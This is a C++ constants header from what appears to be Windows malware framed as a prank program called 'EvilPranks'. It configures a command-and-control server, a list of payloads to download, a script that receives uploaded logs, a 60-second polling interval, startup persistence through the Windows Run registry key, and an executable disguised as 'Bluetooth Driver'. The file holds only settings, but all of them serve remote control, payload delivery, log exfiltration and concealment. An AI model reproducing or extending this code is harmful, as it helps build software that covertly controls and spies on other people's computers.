#ifndef CONSTANTS_H
#define CONSTANTS_H
#include <iostream>

namespace Constants

{
	//host of Command and Control
	const std::string URL_HOST = "somedomain";

	//resource location of the list of payloads to download
	const std::string URL_PAYLOADS_LIST = "/payloads/listofgoodies.php";

	//resource location of the C&C for EvilPranks
	const std::string URL_COMMAND_AND_CONTROL = "/payloads/canhazfun.html";

	//resource location of the script that will receive and manage the logs
	const std::string URL_REPORTS_MANAGER = "/reports/upload.php";

	//POST parameter used to upload logs to the C&C with URL_REPORTS_MANAGER
	const std::string URL_REPORTS_PARAM = "file_content=";

	const int URL_SIZE = 1024;

	//max duration of the prank in EvilPrank in seconds
	const int PRANK_DURATION = 10;

	//sound to be played during the execution of EvilPrank::beEvil()
	const std::string PRANK_SOUND = "heist.wav";

	//Windows start up registry key
	const std::string START_UP_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	//name of our executable
	const std::string EXECUTABLE_NAME = "Bluetooth Driver";

	//path to our binary
	const std::string EXECUTABLE_PATH = "test";

	//sleep time between each request to C&C (in seconds)
	const int sleepTime = 60;

	//SPEAKER MAX VOLUME
	const double MAX_VOLUME = 1.0;

};

#endif // CONSTANTS_H
